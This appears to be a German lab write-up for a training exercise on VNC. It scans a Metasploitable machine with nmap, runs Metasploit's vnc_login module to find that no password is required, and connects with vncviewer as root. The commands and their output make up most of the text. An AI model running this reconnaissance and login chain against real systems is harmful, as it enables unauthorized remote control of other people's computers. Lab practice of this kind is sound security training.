# VNC Exploitation

## Übung (VNC - Recherche)
**Virtual Network Computing (VNC)** ist ein System zur grafischen Fernsteuerung eines Computers über ein Netzwerk. Dabei kann ein Benutzer den Desktop eines entfernten Rechners sehen und mit Maus und Tastatur bedienen.

VNC basiert auf dem **Remote Frame Buffer (RFB) Protokoll**. Der Server überträgt den Bildschirminhalt an den Client, während Eingaben vom Client an den Server gesendet werden.

Ein VNC-System besteht aus zwei Komponenten:

- **VNC Server** – läuft auf dem Zielrechner  
- **VNC Client (Viewer)** – verbindet sich mit dem Server und zeigt den Desktop an

Der Standardport für VNC ist **TCP 5900**. Weitere Displays verwenden Ports wie **5901 oder 5902**.

Sicherheitsprobleme entstehen häufig durch **schwache Passwörter, fehlende Verschlüsselung oder falsche Konfigurationen**.



## Übung( VNC - Scan)
**1. Portscan durchführen**

Zuerst wird mit nmap geprüft, ob der VNC Port offen ist. Der Standardport für VNC ist TCP Port 5900.

Befehl:

nmap -p 5900 192.168.5.51

Ergebnis:

PORT     STATE SERVICE
5900/tcp open  vnc

Das Ergebnis zeigt, dass der Port 5900 geöffnet ist und auf dem Zielsystem ein VNC Server läuft.

**2. Version des Dienstes ermitteln**

Um mehr Informationen über den laufenden Dienst zu erhalten, kann man die Version Detection von nmap verwenden.

Befehl:

nmap -sV -p 5900 192.168.5.51

Ausgabe:

PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC protocol 3.3

Damit erkennt man, welche Protokollversion des VNC Servers verwendet wird.

**3. Banner und Zusatzinformationen mit Script**

nmap bietet spezielle Scripts zur Analyse bestimmter Dienste. Für VNC gibt es das Script vnc-info.

Befehl:

nmap -p 5900 --script vnc-info 192.168.5.51

Ergebnis:

PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|     VNC Authentication (2)


## Übung (VNC - Exploit)

**1. Metasploit starten**

Zuerst wird Metasploit in Kali Linux gestartet.

msfconsole
**2. VNC Modul suchen**

Nach verfügbaren VNC Modulen suchen:

search vnc

Relevantes Modul:

auxiliary/scanner/vnc/vnc_login

Dieses Modul testet mögliche Login-Schwachstellen im VNC Server.

**3. Modul laden**
 
use auxiliary/scanner/vnc/vnc_login
 
**4. Optionen anzeigen**
 
show options

Wichtige Optionen:

Option	Beschreibung
RHOSTS	Ziel IP
RPORT	Ziel Port
 
**5. Ziel konfigurieren**

Zuerst wird die Ziel-IP gesetzt.

set RHOSTS 192.168.5.51


Dann wird der VNC Port gesetzt.

set RPORT 5900
 
**6. Scan starten**
 
run

Ausgabe:

[+] 192.168.5.51:5900 - VNC server does not require authentication

Das bedeutet, dass der VNC Server keine Authentifizierung benötigt.

**Verbindung mit VNC Viewer**

Nachdem genügend Informationen gesammelt wurden, kann eine Verbindung aufgebaut werden.

vncviewer 192.168.5.51:5900

Nach der Verbindung öffnet sich der Desktop der Metasploitable Maschine.

Der eingeloggte Benutzer ist:

root

Damit erhält man vollen Zugriff auf den Desktop des Systems.
